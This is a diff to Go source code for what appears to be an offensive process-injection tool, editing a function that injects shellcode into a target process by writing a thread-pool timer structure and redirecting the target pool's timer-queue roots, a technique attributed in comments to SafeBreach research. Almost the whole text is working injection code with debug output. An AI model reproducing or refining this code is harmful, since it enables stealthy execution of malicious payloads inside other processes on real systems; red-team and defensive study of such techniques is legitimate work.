@@ -987,30 +987,33 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)
 
 	// Step 11: Read target TP_POOL's TimerQueue to get addresses for WindowStart and WindowEnd roots
-	targetTpPoolAddr := workerFactoryInfo.StartParameter
-	var targetTpPool FULL_TP_POOL
-	var bytesRead uintptr
-	ret, _, err = procReadProcessMemory.Call(
-		uintptr(hProcess),
-		targetTpPoolAddr,
-		uintptr(unsafe.Pointer(&targetTpPool)),
-		uintptr(unsafe.Sizeof(targetTpPool)),
-		uintptr(unsafe.Pointer(&bytesRead)),
-	)
-	if ret == 0 {
-		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
-	}
-	output += "[+] Read target process's TP_POOL structure\n"
-
+	// Note: We don't actually need to read the whole TP_POOL, we can calculate the addresses
+	// directly from the Pool pointer we set in the TP_TIMER structure
+	
 	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
-	// Calculate addresses for WindowStart.Root and WindowEnd.Root in target TP_POOL
-	windowStartRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue.WindowStart))
-	windowEndRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue.WindowEnd))
+	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
+	// We already set tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	// So we calculate: Pool + offset(TimerQueue) + offset(AbsoluteQueue) + offset(WindowStart/WindowEnd) + offset(Root)
+	
+	targetTpPoolAddr := workerFactoryInfo.StartParameter
+	
+	// Calculate offsets
+	var dummyPool FULL_TP_POOL
+	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
+	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue))
+	windowStartOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowStart))
+	windowEndOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowEnd))
+	
+	// WindowStart.Root and WindowEnd.Root are at the beginning of TPP_PH (first field)
+	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
+	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
 
-	// Calculate address of our timer's WindowStartLinks
+	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
 	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
 	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
 
+	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
+	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X\n", timerQueueOffset)
 	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
 	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
 	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
